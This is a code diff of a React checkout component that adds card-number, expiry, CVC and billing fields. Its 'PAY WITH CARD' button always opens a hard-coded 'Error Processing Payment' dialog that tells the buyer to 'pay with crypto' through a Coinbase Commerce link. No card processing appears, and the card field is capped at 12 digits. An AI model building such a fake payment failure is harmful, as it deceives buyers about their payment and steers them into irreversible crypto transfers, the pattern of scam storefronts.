@@ -11,6 +11,7 @@ import {
   DialogTitle,
   DialogTrigger,
 } from "@/components/ui/dialog";
+import { ErrorIcon, CheckMarkIcon } from "../ui/icons";
 
 type Props = {};
 
@@ -42,6 +43,10 @@ const Checkout = (props: Props) => {
         </div>
 
         <div className="p-[4%]">
+          <div className="flex items-center gap-[9px] my-4">
+            <CheckMarkIcon />
+            <h2 className="font-bold text-[18px]">PERSONAL INFORMATION</h2>
+          </div>
           <div>
             <label className="">Email Address</label>
             <br />
@@ -70,6 +75,60 @@ const Checkout = (props: Props) => {
             />{" "}
           </div>
 
+          <div className="flex items-center gap-[9px] mt-8 mb-4">
+            <CheckMarkIcon />
+            <h2 className="font-bold text-[18px]">PAYMENT</h2>
+          </div>
+          <div>
+            <label>Card Number</label>
+            <br />
+            <input
+              type="number"
+              placeholder="xxxx xxxx xxxx xxxx"
+              onInput={(e) => {
+                if (e.target.value.length > 12) {
+                  e.target.value = e.target.value.slice(0, 12);
+                }
+              }}
+              maxLength={12}
+              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
+            />{" "}
+          </div>
+          <div>
+            <label>Expiration Date</label>
+            <br />
+            <input
+              type="text"
+              placeholder="MM/YY"
+              maxLength={5}
+              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
+            />{" "}
+          </div>
+          <div>
+            <label>CVC</label>
+            <br />
+            <input
+              type="number"
+              placeholder="x x x"
+              onInput={(e) => {
+                if (e.target.value.length > 3) {
+                  e.target.value = e.target.value.slice(0, 3);
+                }
+              }}
+              maxLength={3}
+              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
+            />{" "}
+          </div>
+          <div>
+            <label>Billing Address</label>
+            <br />
+            <input
+              type="text"
+              placeholder="Billing Address"
+              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
+            />{" "}
+          </div>
+
           <div className="p-[4%]">
             <h1 className="font-bold text-[25px] leading-[42px]">
               $49.99 / <span className="font-normal">Monthly</span>
@@ -85,23 +144,27 @@ const Checkout = (props: Props) => {
 
           <div className="flex flex-col gap-8 justify-center items-center mt-7">
             <Dialog>
-              <DialogTrigger className="bg-[#f1ba13] rounded-md py-3 px-[79px]">
+              <DialogTrigger className="bg-[#f1ba13] rounded-md py-3 px-[87px]">
                 PAY WITH CARD{" "}
               </DialogTrigger>
               <DialogContent>
                 <DialogHeader>
                   <DialogTitle>Error Processing Payment.</DialogTitle>
                   <DialogDescription>
-                    There was an error processing your payment.
-                    <br />
-                    Please, pay with crypto!
-                    <div className="mt-[50px]">
-                      <a
-                        className="buy-with-crypto border border-[#f1ba13] bg-[#f1ba13] rounded-md py-3 px-[79px]"
-                        href="https://commerce.coinbase.com/checkout/27fb1896-2175-4453-80b4-7c379958f6da"
-                      >
-                        PAY WITH CRYPTO
-                      </a>
+                    <div className="flex flex-col justify-center items-center">
+                      <div className="my-6">
+                        <ErrorIcon />
+                      </div>
+                      <p>There was an error processing your payment.</p>
+                      <p>Please, pay with crypto!</p>
+                      <div className="mt-[50px]">
+                        <a
+                          className="buy-with-crypto border border-[#f1ba13] bg-[#f1ba13] rounded-md py-3 px-[79px]"
+                          href="https://commerce.coinbase.com/checkout/27fb1896-2175-4453-80b4-7c379958f6da"
+                        >
+                          PAY WITH CRYPTO
+                        </a>
+                      </div>
                     </div>
                   </DialogDescription>
                 </DialogHeader>
